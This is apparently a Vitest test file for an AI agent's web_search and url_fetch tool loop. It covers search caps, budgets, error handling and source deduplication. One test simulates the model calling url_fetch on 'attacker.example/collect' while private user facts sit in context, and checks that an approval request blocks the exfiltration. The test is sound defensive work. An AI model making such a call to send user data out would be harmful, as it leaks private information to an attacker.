import { beforeEach, describe, it, expect, vi } from 'vitest';
import { parseAgentEventDelta } from '@agiworkforce/cloud-contracts';
import type { AgentEventEnvelope } from '@agiworkforce/types/protocol';

const dnsMocks = vi.hoisted(() => ({ lookup: vi.fn() }));
vi.mock('undici', async (importOriginal) => {
  // pinnedPublicFetch calls undici's own fetch so its Agent and its fetch come
  // from one undici instance; the production runtime rejects a foreign Agent on
  // the global fetch. These tests drive the network through vi.stubGlobal('fetch'),
  // so route undici's fetch back to the global one and leave every other export
  // (Agent, the pinning path) real.
  const actual = await importOriginal<typeof import('undici')>();
  return {
    ...actual,
    fetch: (...args: unknown[]) =>
      (globalThis.fetch as unknown as (...a: unknown[]) => unknown)(...args),
  };
});

vi.mock('node:dns/promises', () => ({
  default: { lookup: dnsMocks.lookup },
  lookup: dnsMocks.lookup,
}));

const factoryMocks = vi.hoisted(() => ({ streamRequest: vi.fn() }));
vi.mock('./tool-loop-anthropic', () => ({
  buildToolLoopStream: factoryMocks.streamRequest,
  buildServingRouteId: (...args: unknown[]) => args.join(':'),
}));

import { runToolLoop, searchResultsEvent } from './tool-loop';
import type { ProcessedRequest } from './request-processor';
import { urlFetchToolDef } from '@/lib/url-fetch/url-fetch-tool';
import { forcedFunctionToolChoice } from '@/lib/required-tool-call';
import {
  webSearchToolDef,
  WEB_SEARCH_MAX_CALLS_PER_TURN,
  WEB_SEARCH_MAX_RESULTS,
  WEB_SEARCH_TOOL,
} from '@/lib/web-search/web-search-tool';

function agentEvents(output: string): AgentEventEnvelope[] {
  return output
    .split('\n')
    .filter((line) => line.startsWith('data: {'))
    .flatMap((line) => {
      const payload = JSON.parse(line.slice('data: '.length)) as {
        choices?: Array<{ delta?: { x_agent_event?: unknown } }>;
      };
      const event = parseAgentEventDelta(payload.choices?.[0]?.delta?.x_agent_event);
      return event ? [event] : [];
    });
}

function sseStream(events: unknown[]): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder();
  const payload = events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join('') + 'data: [DONE]\n\n';
  return new ReadableStream({
    start(controller) {
      controller.enqueue(encoder.encode(payload));
      controller.close();
    },
  });
}

function toolCallStream(
  toolName: string,
  args: Record<string, unknown>,
  callId: string,
): ReadableStream<Uint8Array> {
  return sseStream([
    {
      choices: [
        {
          delta: {
            tool_calls: [
              {
                index: 0,
                id: callId,
                type: 'function',
                function: { name: toolName, arguments: JSON.stringify(args) },
              },
            ],
          },
          index: 0,
        },
      ],
      model: 'test-model',
    },
    { choices: [{ delta: {}, finish_reason: 'tool_calls', index: 0 }], model: 'test-model' },
  ]);
}

function twoToolCallStream(
  calls: Array<{ toolName: string; args: Record<string, unknown>; callId: string }>,
): ReadableStream<Uint8Array> {
  return sseStream([
    {
      choices: [
        {
          delta: {
            tool_calls: calls.map((c, index) => ({
              index,
              id: c.callId,
              type: 'function',
              function: { name: c.toolName, arguments: JSON.stringify(c.args) },
            })),
          },
          index: 0,
        },
      ],
      model: 'test-model',
    },
    { choices: [{ delta: {}, finish_reason: 'tool_calls', index: 0 }], model: 'test-model' },
  ]);
}

function finalAnswerStream(text: string): ReadableStream<Uint8Array> {
  return sseStream([
    { choices: [{ delta: { content: text }, index: 0 }], model: 'test-model' },
    { choices: [{ delta: {}, finish_reason: 'stop', index: 0 }], model: 'test-model' },
  ]);
}

function makeProcessed(tools: unknown[], options: { freeTrial?: boolean } = {}): ProcessedRequest {
  return {
    provider: 'xai',
    requestedModel: 'test-model',
    chatRequest: {
      model: 'test-model',
      messages: [{ role: 'user', content: 'What happened in the news today?' }],
      stream: true,
      web_search: true,
    },
    llmRequest: {
      model: 'test-model',
      messages: [{ role: 'user', content: 'What happened in the news today?' }],
      max_tokens: 256,
      stream: true,
      tools,
    },
    ...(options.freeTrial ? { freeTrial: { reservationId: 'free-search-test' } } : {}),
  } as unknown as ProcessedRequest;
}

async function collect(gen: AsyncGenerator<Uint8Array>): Promise<string> {
  const decoder = new TextDecoder();
  let out = '';
  for await (const chunk of gen) out += decoder.decode(chunk);
  return out;
}

function perplexitySearchResponse(): Response {
  return new Response(
    JSON.stringify({
      results: [
        {
          title: 'Today in the news',
          url: 'https://news.example/today',
          snippet: 'A summary of the top stories.',
          date: '2026-07-11',
        },
      ],
    }),
    { status: 200, headers: { 'content-type': 'application/json' } },
  );
}

beforeEach(() => {
  factoryMocks.streamRequest.mockReset();
  dnsMocks.lookup.mockReset();
  dnsMocks.lookup.mockResolvedValue([{ address: '93.184.216.34', family: 4 }]);
});

describe('tool-loop web_search integration', () => {
  it('executes a model-emitted web_search call end-to-end and emits sources in the web_search shape', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(
        toolCallStream('web_search', { query: 'today news' }, 'call_web_search_1'),
      )
      .mockResolvedValueOnce(finalAnswerStream("Here's what happened today. [1]"));

    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      perplexitySearchResponse(),
    );
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const processed = makeProcessed([webSearchToolDef()]);
      processed.chatRequest = {
        model: 'test-model',
        messages: [{ role: 'user', content: 'What happened in the news today?' }],
        stream: true,
        web_search: true,
      } as never;
      processed.resolvedTaskType = 'research';
      processed.llmRequest.tool_choice = forcedFunctionToolChoice(WEB_SEARCH_TOOL);
      const output = await collect(runToolLoop(processed, { approvalMode: 'auto' }));

      expect(output).toContain('"x_tool_status"');
      expect(output).toContain('"name":"web_search"');
      expect(output).toContain('"status_phrase":"Searching the web"');
      expect(output).toContain('"status":"completed"');

      expect(output).toContain('"x_tool_result"');
      expect(output).toContain('Today in the news');
      expect(output).toContain('news.example/today');

      expect(output).toContain('"x_search_results"');
      expect(output).not.toContain('"tool":"url_fetch"');
      expect(output).toContain('"type":"web_search_result"');
      expect(output).toContain('"url":"https://news.example/today"');
      expect(output).toContain('"title":"Today in the news"');
      expect(output).toContain('"encrypted_content":"A summary of the top stories."');
      expect(output).toContain('"position":1');

      expect(factoryMocks.streamRequest.mock.calls[0]?.[2]).toMatchObject({
        tool_choice: forcedFunctionToolChoice(WEB_SEARCH_TOOL),
      });
      expect(factoryMocks.streamRequest.mock.calls[1]?.[2]).toMatchObject({
        tool_choice: 'auto',
      });

      expect(
        agentEvents(output).find((entry) => entry.event.type === 'source-list')?.event,
      ).toEqual({
        type: 'source-list',
        toolCallId: 'call_web_search_1',
        query: 'today news',
        sources: [
          {
            url: 'https://news.example/today',
            title: 'Today in the news',
            snippet: 'A summary of the top stories.',
          },
        ],
      });

      expect(output).not.toContain('"x_stream_error"');
      expect(output).toContain("Here's what happened today. [1]");
      expect(output).toContain('data: [DONE]');

      expect(fetchMock).toHaveBeenCalledTimes(1);
      const [calledUrl, init] = fetchMock.mock.calls[0]!;
      expect(calledUrl).toBe('https://api.perplexity.ai/search');
      expect(JSON.parse(init!.body as string)).toEqual({
        query: 'today news',
        max_results: WEB_SEARCH_MAX_RESULTS,
      });
      expect((init!.headers as Record<string, string>)['Authorization']).toBe(
        'Bearer pplx-test-key',
      );

      const secondRequest = factoryMocks.streamRequest.mock.calls[1]?.[2] as {
        messages: Array<{ role: string; content: string; tool_call_id?: string }>;
      };
      const toolMsg = secondRequest.messages.find((m) => m.role === 'tool');
      expect(toolMsg?.tool_call_id).toBe('call_web_search_1');
      expect(toolMsg?.content).toContain('Today in the news');
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('caps a Free-tier fallback search at five results', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(
        toolCallStream('web_search', { query: 'today news' }, 'call_web_search_free'),
      )
      .mockResolvedValueOnce(finalAnswerStream('Here are the most relevant sources.'));

    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      perplexitySearchResponse(),
    );
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      await collect(
        runToolLoop(makeProcessed([webSearchToolDef()], { freeTrial: true }), {
          approvalMode: 'auto',
        }),
      );

      const [, init] = fetchMock.mock.calls[0]!;
      expect(JSON.parse(init!.body as string)).toEqual({
        query: 'today news',
        max_results: 5,
      });
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('never attaches more sources to one turn than the per-call cap times the call budget', async () => {
    const searches = WEB_SEARCH_MAX_CALLS_PER_TURN + 3;
    for (let i = 0; i < searches; i++) {
      factoryMocks.streamRequest.mockResolvedValueOnce(
        toolCallStream('web_search', { query: `query ${i}` }, `call_source_ceiling_${i}`),
      );
    }
    factoryMocks.streamRequest.mockResolvedValueOnce(finalAnswerStream('Done.'));

    let batch = 0;
    const fetchMock = vi.fn(async () => {
      const offset = batch++ * 100;
      return new Response(
        JSON.stringify({
          results: Array.from({ length: 40 }, (_, i) => ({
            title: `Result ${offset + i}`,
            url: `https://news.example/${offset + i}`,
            snippet: 's',
          })),
        }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      );
    });
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const output = await collect(
        runToolLoop(makeProcessed([webSearchToolDef()]), { approvalMode: 'auto' }),
      );

      const emittedCounts = output
        .split('\n')
        .filter((line) => line.startsWith('data: {'))
        .flatMap((line) => {
          const payload = JSON.parse(line.slice('data: '.length)) as {
            choices?: Array<{ delta?: { x_search_results?: { content?: unknown[] } } }>;
          };
          const content = payload.choices?.[0]?.delta?.x_search_results?.content;
          return Array.isArray(content) ? [content.length] : [];
        });

      const ceiling = WEB_SEARCH_MAX_CALLS_PER_TURN * WEB_SEARCH_MAX_RESULTS;
      expect(emittedCounts.length).toBeGreaterThan(0);
      expect(Math.max(...emittedCounts)).toBeLessThanOrEqual(ceiling);
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it(`stops searching after ${WEB_SEARCH_MAX_CALLS_PER_TURN} calls in one turn and tells the model to answer from what it has`, async () => {
    for (let i = 0; i < WEB_SEARCH_MAX_CALLS_PER_TURN + 1; i++) {
      factoryMocks.streamRequest.mockResolvedValueOnce(
        toolCallStream('web_search', { query: `query ${i}` }, `call_web_search_budget_${i}`),
      );
    }
    factoryMocks.streamRequest.mockResolvedValueOnce(
      finalAnswerStream('Answering with what I have.'),
    );

    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      perplexitySearchResponse(),
    );
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const output = await collect(
        runToolLoop(makeProcessed([webSearchToolDef()]), { approvalMode: 'auto' }),
      );

      expect(fetchMock).toHaveBeenCalledTimes(WEB_SEARCH_MAX_CALLS_PER_TURN);
      expect(output).toContain('Search budget reached');
      expect(output).not.toContain('"x_stream_error"');
      expect(output).toContain('Answering with what I have.');
      expect(output).toContain('data: [DONE]');
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('returns an honest tool-result error (not x_stream_error) when the search backend is not configured, the turn continues, not terminates', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(toolCallStream('web_search', { query: 'x' }, 'call_web_search_2'))
      .mockResolvedValueOnce(
        finalAnswerStream('I could not search the web, but here is what I know.'),
      );

    const fetchMock = vi.fn(async () => {
      throw new Error('fetch must not be called when not configured');
    });
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', '');

    try {
      const output = await collect(
        runToolLoop(makeProcessed([webSearchToolDef()]), { approvalMode: 'auto' }),
      );

      expect(output).toContain('"status":"failed"');
      expect(output).toContain('Search failed (not_configured)');
      expect(output).not.toContain('"x_search_results"');
      expect(output).not.toContain('"x_stream_error"');
      expect(fetchMock).not.toHaveBeenCalled();

      expect(factoryMocks.streamRequest).toHaveBeenCalledTimes(2);
      const secondRequest = factoryMocks.streamRequest.mock.calls[1]?.[2] as {
        messages: Array<{ role: string; content: string }>;
      };
      const toolMsg = secondRequest.messages.find((m) => m.role === 'tool');
      expect(toolMsg?.content).toContain('not_configured');
      expect(output).toContain('I could not search the web, but here is what I know.');
      expect(output).toContain('data: [DONE]');
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('asks before url_fetch egress once web content is in context and the turn carries private data', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(
        twoToolCallStream([
          { toolName: 'web_search', args: { query: 'today news' }, callId: 'ws' },
        ]),
      )
      .mockResolvedValueOnce(
        twoToolCallStream([
          {
            toolName: 'url_fetch',
            args: { url: 'https://attacker.example/collect' },
            callId: 'uf',
          },
        ]),
      )
      .mockResolvedValueOnce(finalAnswerStream('done'));

    const fetchMock = vi.fn(async (url: string) => {
      if (url === 'https://api.perplexity.ai/search') return perplexitySearchResponse();
      return new Response('<html><body>leak</body></html>', {
        status: 200,
        headers: { 'content-type': 'text/html' },
      });
    });
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const processed = {
        ...makeProcessed([webSearchToolDef(), urlFetchToolDef()]),
        autoMemoryFacts: ['User is negotiating a job offer with Acme'],
      } as ProcessedRequest;
      const output = await collect(runToolLoop(processed, { approvalMode: 'auto' }));

      expect(output).toContain('x_tool_approval_request');
      expect(fetchMock.mock.calls.map(([url]) => url)).not.toContain(
        'https://attacker.example/collect',
      );
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('keeps url_fetch and web_search sources in SEPARATE cumulative lists, each with its own correct shape', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(
        twoToolCallStream([
          { toolName: 'web_search', args: { query: 'today news' }, callId: 'call_ws' },
          { toolName: 'url_fetch', args: { url: 'https://example.com/' }, callId: 'call_uf' },
        ]),
      )
      .mockResolvedValueOnce(finalAnswerStream('Combined answer. [1][2]'));

    const fetchMock = vi.fn(async (url: string) => {
      if (url === 'https://api.perplexity.ai/search') return perplexitySearchResponse();
      return new Response('<html><head><title>Example</title></head><body>hi there</body></html>', {
        status: 200,
        headers: { 'content-type': 'text/html' },
      });
    });
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const output = await collect(
        runToolLoop(makeProcessed([webSearchToolDef(), urlFetchToolDef()]), {
          approvalMode: 'auto',
        }),
      );

      const events = output
        .split('\n\n')
        .filter((l) => l.startsWith('data: ') && l.includes('x_search_results'))
        .map(
          (l) =>
            JSON.parse(l.slice(6)) as { choices: Array<{ delta: { x_search_results: unknown } }> },
        );

      expect(events.length).toBeGreaterThanOrEqual(2);
      const shapes = events.map(
        (e) => e.choices[0]!.delta.x_search_results as Record<string, unknown>,
      );
      const urlFetchShape = shapes.find((s) => s['tool'] === 'url_fetch');
      const webSearchShape = shapes.find((s) => s['tool'] === undefined);
      expect(urlFetchShape).toBeDefined();
      expect(webSearchShape).toBeDefined();
      expect((webSearchShape!['content'] as Array<{ url: string }>)[0]?.url).toBe(
        'https://news.example/today',
      );
      expect((urlFetchShape!['content'] as Array<{ url: string }>)[0]?.url).toBe(
        'https://example.com/',
      );
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('dedupes accumulated web_search sources that only differ by a tracking query parameter', async () => {
    factoryMocks.streamRequest
      .mockResolvedValueOnce(
        toolCallStream('web_search', { query: 'first query' }, 'call_tracking_dup_1'),
      )
      .mockResolvedValueOnce(
        toolCallStream('web_search', { query: 'second query' }, 'call_tracking_dup_2'),
      )
      .mockResolvedValueOnce(finalAnswerStream('Combined findings. [1][2]'));

    let call = 0;
    const fetchMock = vi.fn(async () => {
      call += 1;
      const results =
        call === 1
          ? [{ title: 'Canonical Page', url: 'https://news.example/story', snippet: 'first' }]
          : [
              {
                title: 'Canonical Page via newsletter',
                url: 'https://news.example/story?utm_source=newsletter&utm_campaign=weekly',
                snippet: 'tracked',
              },
              { title: 'A Different Page', url: 'https://news.example/other', snippet: 'other' },
            ];
      return new Response(JSON.stringify({ results }), {
        status: 200,
        headers: { 'content-type': 'application/json' },
      });
    });
    vi.stubGlobal('fetch', fetchMock);
    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');

    try {
      const output = await collect(
        runToolLoop(makeProcessed([webSearchToolDef()]), { approvalMode: 'auto' }),
      );

      const searchResultsEvents = output
        .split('\n')
        .filter((line) => line.startsWith('data: {'))
        .map(
          (line) =>
            JSON.parse(line.slice('data: '.length)) as {
              choices?: Array<{
                delta?: { x_search_results?: { content?: Array<{ url: string }> } };
              }>;
            },
        )
        .map((payload) => payload.choices?.[0]?.delta?.x_search_results?.content)
        .filter((content): content is Array<{ url: string }> => Array.isArray(content));

      const finalSources = searchResultsEvents[searchResultsEvents.length - 1] ?? [];
      expect(finalSources.map((s) => s.url)).toEqual([
        'https://news.example/story',
        'https://news.example/other',
      ]);
    } finally {
      vi.unstubAllGlobals();
      vi.unstubAllEnvs();
    }
  });

  it('searchResultsEvent emits the research-loop-compatible shape: no tool field, snippet as encrypted_content', () => {
    const line = searchResultsEvent(
      [
        { url: 'https://a.example/', title: 'A', snippet: 'snip a' },
        { url: 'https://b.example/', title: 'B' },
      ],
      'test-model',
    );
    const parsed = JSON.parse(line.replace(/^data: /, '').trim()) as {
      choices: Array<{ delta: { x_search_results: Record<string, unknown> } }>;
    };
    const block = parsed.choices[0]!.delta.x_search_results;
    expect(block['tool']).toBeUndefined();
    expect(block['content']).toEqual([
      {
        type: 'web_search_result',
        url: 'https://a.example/',
        title: 'A',
        encrypted_content: 'snip a',
        position: 1,
      },
      {
        type: 'web_search_result',
        url: 'https://b.example/',
        title: 'B',
        encrypted_content: '',
        position: 2,
      },
    ]);
  });
});
